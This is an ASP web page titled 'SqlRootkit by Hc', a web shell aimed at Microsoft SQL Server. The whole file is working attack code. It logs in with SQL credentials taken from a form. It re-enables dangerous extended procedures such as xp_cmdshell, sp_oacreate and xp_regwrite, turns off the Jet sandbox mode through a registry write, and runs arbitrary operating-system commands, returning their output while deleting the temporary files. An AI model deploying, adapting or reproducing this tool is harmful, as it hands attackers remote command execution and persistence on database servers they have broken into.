<html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=gb2312"> 
<title>sql</title>
<STYLE TYPE="text/css">
<!--
body { font-size: 14pt;color: red; font-family: impact}
font { border:0;font-size: 16px; color: red; font-family: impact;text-decoration: none }
form { border:0;background-color: white; font-size: 14pt;color: blue; font-family: impact}
A    { text-decoration: none;}
textarea {width:100%; background-color: white; font-size: 14pt;color: red;font-family: impact}

-->
</STYLE> 
</head> 
<body bgcolor=white>      
<%
If request("action")="login" then
		       set adoConn=Server.CreateObject("ADODB.Connection") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=192.168.1.180;Password=" & request.Form("pass") & ";UID=" & request.Form("name")
		       session("login")="yes"
		       session("name")=request.Form("name")
		       session("pass")=request.Form("pass")

elseif request("action")="test"  then
                       set adoConn=Server.CreateObject("ADODB.Connection") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=192.168.1.180;Password=" & session("pass") & ";UID=" & session("name")
                       strQuery="select count(*) from master.dbo.sysobjects where xtype='X' and name='xp_cmdshell'"
		       set recResult = adoConn.Execute(strQuery) 
		       If recResult(0) Then
		       session("XP_cmdshell")=1 
		       response.write "<font color=red>XP_cmdshell  yes!</font>"
                       else
		       session("XP_cmdshell")=0 
		       response.write "<font color=red>XP_cmdshell  No!</font>"
                       End if
		       strQuery="select count(*) from master.dbo.sysobjects where xtype='X' and name='sp_oacreate'"
		       set recResult = adoConn.Execute(strQuery) 
		       If recResult(0) Then 
		       response.write "<br><font color=red>sp_oacreate yes!</font>"
		       session("sp_oacreate")=1
                       else 
		       response.write "<br><font color=red>sp_oacreate no!</font>"
                       session("sp_oacreate")=0
                       End if
		       strQuery="select count(*) from master.dbo.sysobjects where xtype='X' and name='xp_regwrite'"
		       set recResult = adoConn.Execute(strQuery) 
		       If recResult(0) Then 
		       response.write "<br><font color=red>xp_regwrite yes!</font>"
		       session("xp_regwrite")=1
                       else 
		       response.write "<br><font color=red>xp_regwrite no!</font>"
		       session("xp_regwrite")=0
                       End if

elseif request("action")="cmd" then
                       set adoConn=Server.CreateObject("ADODB.Connection") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=192.168.1.180;Password=" & session("pass") & ";UID=" & session("name")
		       If request("tool")="XP_cmdshell" then
		       
		       If request.form("cmd")<>"" Then 
  		       strQuery = "exec master.dbo.xp_cmdshell '" & request.form("cmd") & "'" 
                       set recResult = adoConn.Execute(strQuery) 
                       If NOT recResult.EOF Then 
                       Do While NOT recResult.EOF 
                       strResult = strResult & chr(13) & recResult(0) 
                       recResult.MoveNext 
                       Loop
		       End if
		       set recResult = Nothing
		       Response.Write "<textarea rows=10 cols=50>"
                       Response.Write request.form("cmd") 
                       Response.Write strResult
                       Response.Write "</textarea>"
		       end if 
		       		       
                       elseif request("tool")="sp_oacreate" then 
		       
		       If request.form("cmd")<>"" Then 
  		       strQuery = "CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',NULL,'cmd /c "&request("cmd")&" > 8617.tmp',0,true;BULK INSERT [jnc] FROM '8617.tmp' WITH (KEEPNULLS);"
		       adoConn.Execute(strQuery)
                       strQuery = "select * from jnc"
		       set recResult = adoConn.Execute(strQuery)
		       If NOT recResult.EOF Then 
                       Do While NOT recResult.EOF 
                       strResult = strResult & chr(13) & recResult(0) 
                       recResult.MoveNext 
                       Loop 
                       End if
		       set recResult = Nothing
		       Response.Write "<textarea rows=10 cols=50>"
                       Response.Write request.form("cmd") 
                       Response.Write strResult
                       Response.Write "</textarea>"
		       strQuery = "DROP TABLE [jnc];declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',NULL,'cmd /c del 8617.tmp'"
 		       adoConn.Execute(strQuery)
		       End if

                       elseif request("tool")="xp_regwrite" then
		       
		       If request.form("cmd")<>"" Then
		       cmd=chr(34)&"cmd.exe /c "&request.form("cmd")&" > 8617.tmp"&chr(34)
		       strQuery = "CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;select * from openrowset('microsoft.jet.oledb.4.0',';database=d:\freehost\gongsi\web\o.mdb','select shell("&cmd&")');"
                       adoConn.Execute(strQuery)
		       strQuery = "select * from openrowset('microsoft.jet.oledb.4.0',';database=d:\freehost\gongsi\web\o.mdb','select shell("&chr(34)&"cmd.exe /c copy 8617.tmp jnc.tmp"&chr(34)&")');BULK INSERT [jnc] FROM 'jnc.tmp' WITH (KEEPNULLS);"
		       set recResult = adoConn.Execute(strQuery)
		       strQuery="select * from [jnc];"
                       set recResult = adoConn.Execute(strQuery)
		       If NOT recResult.EOF Then 
                       Do While NOT recResult.EOF 
                       strResult = strResult & chr(13) & recResult(0) 
                       recResult.MoveNext 
                       Loop 
                       End if
                       set recResult = Nothing
		       Response.Write "<textarea rows=10 cols=50>"
                       Response.Write request.form("cmd") 
                       Response.Write strResult
                       Response.Write "</textarea>"
		       strQuery = "DROP TABLE [jnc];exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=d:\freehost\gongsi\web\o.mdb','select shell("&chr(34)&"cmd.exe /c del 8617.tmp&&del jnc.tmp"&chr(34)&")');"
		       adoConn.Execute(strQuery)
		       End if
end if

elseif request("action")="resume" then
                       set adoConn=Server.CreateObject("ADODB.Connection") 
 		       adoConn.Open "Provider=SQLOLEDB.1;Password=" & session("pass") & ";UID=" & session("name")
                       if session("xp_cmdshell")=0 then
                       strQuery="dbcc addextendedproc ('xp_cmdshell','xplog70.dll')"
		       adoConn.Execute(strQuery)	
                       response.write "<font color=red>Test-xp_cmdshell</font>"
		       end if
                       if session("sp_OACreate")=0 then
		       strQuery="dbcc addextendedproc ('sp_OACreate','odsole70.dll')"
		       adoConn.Execute(strQuery)	
                       response.write "<font color=red>Test-sp_OACreate</font>"
                       end if
		       if session("xp_regwrite")=0 then
		       strQuery="dbcc addextendedproc ('xp_regwrite','xpstar.dll')"
		       adoConn.Execute(strQuery)	
                       response.write "<font color=red>Test-xp_regwrite</font>"	
		       else response.write "<font color=red>Ok£¡Good</font>"	
                       end if 	
                                
elseif request("action")="logout" then
                       session("login")=""
		              
end if


%>
<%
if session("login")="" then
			   response.write "<form name=form method=POST action="&Request.ServerVariables("URL")&">"
			   response.write "<p>SQLUser"
			   response.write "<input name=name type=text id=name value="&session("name")&">"
 		           response.write "  SQLPass"
			   response.write "<input name=pass type=password id=pass value="&session("pass")&">"
			   response.write "  <input name=action type=submit value=login>"
			   response.write "</form>"

else                       response.write "<form name=form method=POST action="&Request.ServerVariables("URL")&">"
			   response.write "<p>TESTExp"
			   response.write "  <input name=action type=hidden value=test>"
			   response.write "  <input type=submit value=TestExp>"
			   response.write "</form>"

                           response.write "<form name=form method=POST action="&Request.ServerVariables("URL")&">"
			   response.write "<p>BackExp"
			   response.write "  <input name=action type=hidden value=resume>"
			   response.write "  <input type=submit value=BackExp>"
			   response.write "</form>"

		           response.write "<form name=form method=POST action="&Request.ServerVariables("URL")&">"
			   response.write "<p>Cmd"
			   response.write "  <input name=cmd type=text>"
			   response.write "<select name='tool' ><option value=''>----Pl----</option><option value=XP_cmdshell>XP_cmdshell</option><option value=sp_oacreate>sp_oacreate</option><option value=xp_regwrite>xp_regwrite</option></option></select>"
			   response.write "  <input name=action type=hidden value=cmd>"
			   response.write "  <input type=submit value=Ok>"			   
			   response.write "</form>"


                           
end if
%>
<br>
<br>
<br>
<center>
<p><font size="2" color="#084B8E">SqlRootkit by Hc</font>
<%
response.write "<a href="&Request.ServerVariables("URL")&"?action=logout><font color=black>quit</font></a>"
%>
<br>
<center>Hc</center>
</p>
<center>


